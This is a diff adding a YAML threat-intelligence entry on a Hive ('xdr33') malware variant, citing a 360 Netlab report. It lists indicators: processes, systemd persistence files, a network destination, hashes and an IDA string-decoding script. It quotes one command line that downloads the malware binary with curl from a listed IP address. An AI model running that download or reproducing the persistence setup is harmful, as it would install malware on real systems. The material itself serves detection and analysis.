@@ -1,0 +1,65 @@
+description: Malware leveraging a beacon for communication and executing various commands
+  to establish persistence.
+attribution: CIAHive
+malware_families:
+- CIAHive
+TTPs:
+  processes:
+  - hlogd
+  - bash
+  - curl
+  commandline:
+  - /bin/bash /var/service/logd.check
+  - curl http://45.9.150.144:20966/1in-x86 -o /command/bin/hlogd
+  scripting_engine:
+  - python
+  - bash
+  python:
+  - ' import idautils
+      import ida_bytes
+
+      def decode(addr,len):
+          tmp=bytearray()
+          
+          buf=ida_bytes.get_bytes(addr,len)
+          for i in buf:
+              tmp.append(~i&0xff)
+
+          print("%x, %s" %(addr,bytes(tmp)))
+          ida_bytes.put_bytes(addr,bytes(tmp))
+          idc.create_strlit(addr,addr+len)
+          
+      calllist=idautils.CodeRefsTo(0x0804F1D8,1)
+      for addr in calllist:
+          prev1Head=idc.prev_head(addr)
+          if "push    offset" in idc.generate_disasm_line(prev1Head,1) and idc.get_operand_type(prev1Head,0)==5:
+              bufaddr=idc.get_operand_value(prev1Head,0)
+              prev2Head=idc.prev_head(prev1Head)
+              
+              if "push" in idc.generate_disasm_line(prev2Head,1) and idc.get_operand_type(prev2Head,0)==5:
+                  leng=idc.get_operand_value(prev2Head,0)
+                  decode(bufaddr,leng)
+      '
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Logd
+  file_activity:
+  - /etc/systemd/system/logd.service
+  - /etc/systemd/system/logd.timer
+  - /var/service/logd.check
+  - /command/bin/hlogd
+  persistence:
+  - systemd service and timer creation for logd
+  network_connections:
+  - destination: 45.9.150.144
+    port: 20966
+    protocol: TCP
+IOCs:
+- ee07a74d12c0bb3594965b51d0e45b6f
+- af5d2dfcafbb23666129600f982ecb87
+- 45.9.150.144:443
+authors:
+- Alex.Turing
+- Hui Wang
+reference: https://blog.netlab.360.com/warning-hive-variant-xdr33-is-coming_cn/
+date_of_publication: January 09, 2023
+file_creation_date: July 07, 2025
